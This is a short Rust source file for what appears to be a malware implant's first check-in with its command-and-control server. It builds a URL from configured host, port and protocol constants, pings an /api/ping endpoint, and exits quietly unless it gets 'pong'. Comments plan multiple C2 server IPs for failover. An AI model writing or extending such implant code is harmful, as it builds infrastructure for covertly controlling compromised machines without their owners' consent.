use reqwest;
use std::process;

use crate::errors::ImplantError;
use crate::{HOST, PORT, PROTOCOL};

// TODO: Server needs to send config parameters for initial connection
// TODO: Add many C2 server IPs and check which one is up and running
const INITIAL_ENDPOINT: &str = "/api/ping";

pub fn initial_connection() -> Result<(), ImplantError> {
    let full_url = format!("{}://{}:{}{}", PROTOCOL, HOST, PORT, INITIAL_ENDPOINT);

    let response = reqwest::blocking::get(full_url)?.text()?;

    if response != "pong".to_string() {
        process::exit(0);
    }

    Ok(())
}
